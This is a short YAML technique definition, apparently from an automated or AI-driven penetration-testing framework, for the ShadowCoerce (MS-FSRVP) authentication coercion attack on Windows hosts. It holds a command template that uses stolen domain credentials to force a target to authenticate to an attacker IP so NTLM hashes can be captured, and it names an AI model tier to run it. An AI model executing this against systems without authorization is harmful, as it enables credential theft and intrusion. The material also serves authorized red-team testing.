name: shadowcoerce
category: services
description: ShadowCoerce (MS-FSRVP)
preconditions:
- os==windows
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: python3 shadowcoerce.py -d {domain} -u '{username}' -p '{password}'
  {attacker_ip} {target_ip}
parser: generic_parser
expected_effects:
- coerced_auth
- ntlm_captured
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: "- [Unit 42 \u2013 Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)\
  \ - [Microsoft \u2013 MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft."
hacktricks_ref: windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
